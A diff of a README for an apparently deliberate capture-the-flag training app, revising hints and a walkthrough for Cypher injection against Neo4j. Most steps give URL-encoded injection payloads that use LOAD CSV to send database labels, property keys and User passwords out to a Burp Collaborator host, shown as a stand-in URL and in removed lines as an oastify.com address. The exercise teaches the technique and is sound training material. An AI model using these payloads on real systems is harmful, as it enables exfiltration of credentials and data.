@@ -88,6 +88,7 @@ In part, this application tests your knowledge of Neo4j and Cypher Query Languag
   2. You will need to understand how to use [Neo4j's db.labels() and db.propertyKeys() procedures](https://Neo4j.com/docs/cypher-manual/current/clauses/call/) to map this database.
   3. You will need to understand how to use [Neo4j's LOAD CSV functionality](https://Neo4j.com/developer/guide-import-csv/) to cause Neo4j to make http requests.
   4. You will need to understand how to use the two together to [extract information from Neo4j](https://www.sidechannel.blog/en/the-cypher-injection-saga/).
+  5. Focus on a ```person``` who had flags associated with their records already, like the ```Tom```s
 </details>
 
 <details>
@@ -99,45 +100,45 @@ You need [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/
 2. Get list of all labels in the database and look for something interesting
 
 ```
-person=Christian+Bale"+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2blabel+AS+r+return+person//&search=go
-person=Christian+Bale"+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&search=go
+person=Christian+Bale"})+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'https://your.burpcollaboratorurl.com/'%2blabel+AS+r+return+person//&role=ACTED_IN&search=go
 ```
 
 3. Get list of all properties in the database and look for something interesting
 
 ```
-person=Christian+Bale"+CALL+db.propertyKeys()+YIELD+propertyKey+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bpropertyKey+AS+r+return+person//&search=go
-person=Christian+Bale"+CALL+db.propertyKeys()+YIELD+propertyKey+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&search=go
+person=Christian+Bale"})+CALL+db.propertyKeys()+YIELD+propertyKey+LOAD+CSV+FROM+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&role=ACTED_IN&search=go
 ```
 
-4. Try variations of the following payload, replacing LABEL with an actual label and PROPERTY with an actual property from steps 1 & 2. This will tell you what properties go with what labels - if no error is thrown you have a property matched to a label.
+4. Try variations of the following payload, replacing LABEL with an actual label and PROPERTY with an actual property from steps 1 & 2. This will tell you what properties go with what labels - if results are returned, a property has been matched to a label. (We use the variable ```movie``` in these payloads because that's the variable the application code expects. Changing that would render no results and may cause errors instead of useful information)
 
 ```
-person=Christian+Bale"})-[role]->(node:LABEL)+RETURN+person,role,node.PROPERTY&role=DIRECTED&search=go
+person=Tom Cruise"})-[role]-(movie:LABEL)+WHERE+movie.PROPERTY+IS+NOT+null+return+person,role,movie//
 ```
 
-For example, this should throw an error
+For example, these should not return data because the User nodes do not have a property called ```notrealproperty``` or ```tagline```.
 
 ```
-person=Christian+Bale"})-[role]->(node:Person)+RETURN+person,role,node.title&role=DIRECTED&search=go
+person=Tom Cruise"})-[role]-(movie:User)+WHERE+movie.notrealproperty+IS+NOT+null+return+person,role,movie//
+person=Tom Cruise"})-[role]-(movie:User)+WHERE+movie.tagline+IS+NOT+null+return+person,role,movie//
 ```
 
-And this should not throw an error, but you won't see the data for ```node.title``` because of the code that's printing data to the screen
+And this should return data because the Movie nodes do have properties called ```tagline``` and ```released``` although they never show up in our web application
 
 ```
-person=Christian+Bale"})-[role]->(node:Movie)+RETURN+person,role,node.title&role=DIRECTED&search=go
+person=Tom Cruise"})-[role]-(movie:Movie)+WHERE+movie.tagline+IS+NOT+null+return+person,role,movie//
+person=Tom Cruise"})-[role]-(movie:Movie)+WHERE+movie.released+IS+NOT+null+return+person,role,movie//
 ```
 
-5. Once you've decided what LABEL and PROPERTY you are interested in, use the following payload, foreach person in the database, replacing LABEL with the label and PROPERTY with the property and watch your collaborator space or your server access logs. 
+5. Once you've decided what LABEL and PROPERTY you are interested in, use the following payload, foreach person in the database, replacing LABEL with the label and PROPERTY with the property and watch your collaborator space or your server access logs for requests. 
 
 ```
-person=Tom+Cruise"})-[role]->(node:LABEL)+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bperson.name%2b'/'%2bnode.PROPERTY+AS+r+return+person//&search=go//&role=DIRECTED&search=go
+person=Tom+Cruise"})-[role]->(movie:LABEL)+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bperson.name%2b'/'%2bmovie.PROPERTY+AS+r+return+person,role,movie//&role=DIRECTED&search=go
 ```
 
-For example
+For example, we should now know node ```User``` has a property ```title``` so this should send information to collaborator or your web server
 
 ```
-person=Tom+Cruise"})-[role]->(node:User)+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bperson.title%2b'/'%2bnode.password+AS+r+return+person//&search=go//&role=DIRECTED&search=go
+person=Tom+Cruise"})-[role]->(movie:User)+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bperson.name%2b'/'%2bmovie.title+AS+r+return+person,role,movie//&role=DIRECTED&search=go
 ```
 
 6. Some of the flags may need to be further figured out.
@@ -154,26 +155,25 @@ You need [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/
 2. Get a list of all labels in the database - you are looking for the ```User``` label.
 
 ```
-person=Christian+Bale"+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2blabel+AS+r+return+person//&search=go
 person=Christian+Bale"+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&search=go
 ```
 
 3. Get list of all properties in the database - you are looking for the ```password``` label. 
 
 ```
-person=Christian+Bale"+CALL+db.propertyKeys()+YIELD+propertyKey+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bpropertyKey+AS+r+return+person//&search=go
 person=Christian+Bale"+CALL+db.propertyKeys()+YIELD+propertyKey+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&search=go
 ```
 
 4. Use the following payloads to get the BONUS flags.
 
 ```
-person=Tom+Tykwer"})-[role]->(node:User)+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bperson.title%2b'/'%2bnode.password+AS+r+return+person//&search=go//&role=DIRECTED&search=go
+person=Tom+Tykwer"})-[role]->(movie:User)+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bperson.name%2b'/'%2bmovie.password+AS+r+return+person,role,movie//&role=DIRECTED&search=go
 
-person=Tom+Cruise"})-[role]->(node:User)+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bperson.title%2b'/'%2bnode.password+AS+r+return+person//&search=go//&role=DIRECTED&search=go
+person=Tom+Cruise"})-[role]->(movie:User)+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bperson.name%2b'/'%2bmovie.password+AS+r+return+person,role,movie//&role=DIRECTED&search=go
 
-person=Tom+Skerritt"})-[role]->(node:User)+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bperson.title%2b'/'%2bnode.password+AS+r+return+person//&search=go//&role=DIRECTED&search=go
+person=Tom+Skerritt"})-[role]->(movie:User)+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bperson.name%2b'/'%2bmovie.password+AS+r+return+person,role,movie//&role=DIRECTED&search=go
 ```
+
 5. The BONUS^MEDIUM password is base64 encoded 3x. 
 6. The BONUS^HARD password is encoded using Ceasar Cipher then converted to asciihex then base64 encoded.
 </details>
